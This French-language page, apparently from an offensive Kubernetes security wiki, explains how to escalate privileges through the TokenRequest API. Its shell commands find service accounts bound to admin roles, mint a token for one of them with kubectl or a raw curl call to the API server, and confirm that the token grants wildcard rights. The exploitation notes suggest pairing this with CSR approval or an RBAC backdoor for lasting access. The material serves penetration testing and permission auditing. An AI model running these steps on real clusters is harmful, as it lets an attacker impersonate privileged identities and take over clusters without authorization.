---
title: "API TokenRequest : générer des jetons pour d'autres comptes de service"
order: 7
description: "L'API TokenRequest émet un jeton lié pour un compte de service via la sous-ressource serviceaccounts/token. Une identité capable de créer des jetons pour un compte de service plus privilégié qu'elle génère le jeton de ce compte et agit en son nom, escaladant en empruntant l'identité de tout compte de service pour lequel elle est autorisée à demander des jetons."
keywords:
  - tokenrequest
  - serviceaccounts token
  - service account
  - bound token
  - privilege escalation
---

# API TokenRequest

L'API TokenRequest génère un jeton à courte durée de vie, lié à une audience, pour un compte de service ; elle est exposée en tant que sous-ressource `serviceaccounts/token` et utilisée par `kubectl create token`. L'escalade est simple : si l'identité courante peut créer un jeton pour un compte de service disposant de plus de permissions qu'elle, elle génère le jeton de ce compte puis agit avec ses droits. Cela emprunte une identité plus puissante sans toucher à aucune liaison.

Vérifiez ce que l'identité peut demander :

```bash
kubectl auth can-i create serviceaccounts/token
kubectl auth can-i create serviceaccounts/token --subresource=token -n kube-system
# find privileged service accounts to target (bound to admin-ish roles)
kubectl get clusterrolebindings -o json | python3 -c '
import sys,json
for b in json.load(sys.stdin)["items"]:
    r=b.get("roleRef",{}).get("name","")
    for s in b.get("subjects") or []:
        if s.get("kind")=="ServiceAccount" and ("admin" in r or r=="cluster-admin"):
            print(r, s["namespace"]+"/"+s["name"])'
```

## Générer et utiliser le jeton

```bash
# mint a token for a powerful service account
kubectl create token <privileged-sa> -n <ns> --duration=24h
# raw API equivalent:
curl -sk -XPOST -H "Authorization: Bearer $T" -H 'Content-Type: application/json' \
  $APISERVER/api/v1/namespaces/<ns>/serviceaccounts/<privileged-sa>/token \
  -d '{"spec":{"audiences":["https://kubernetes.default.svc"]}}'
# use the returned token as that service account
kubectl --token="<minted>" auth can-i '*' '*'
```

## Notes d'exploitation

- Le verrou est le droit `create` sur `serviceaccounts/token` pour le compte cible ; combiné à un compte de service lié à un rôle puissant (repéré via l'analyse des liaisons ci-dessus), c'est une escalade directe.
- Les jetons générés sont liés et limités dans le temps, il s'agit donc d'un accès plutôt que d'une persistance durable ; associez-le à l'[approbation de CSR](csr-approval.md) ou à une [porte dérobée RBAC](../persistence/rbac-backdoor.md) pour obtenir de la durabilité.
- C'est aussi le mécanisme sous-jacent à la découverte légitime de jetons ; voir [Découverte des comptes de service et des jetons](../cluster-enumeration/service-account-and-token-discovery.md).

## Références

- [Kubernetes : API TokenRequest](https://kubernetes.io/docs/reference/kubernetes-api/authentication-resources/token-request-v1/)
- [Kubernetes : kubectl create token](https://kubernetes.io/docs/reference/kubectl/generated/kubectl_create/kubectl_create_token/)
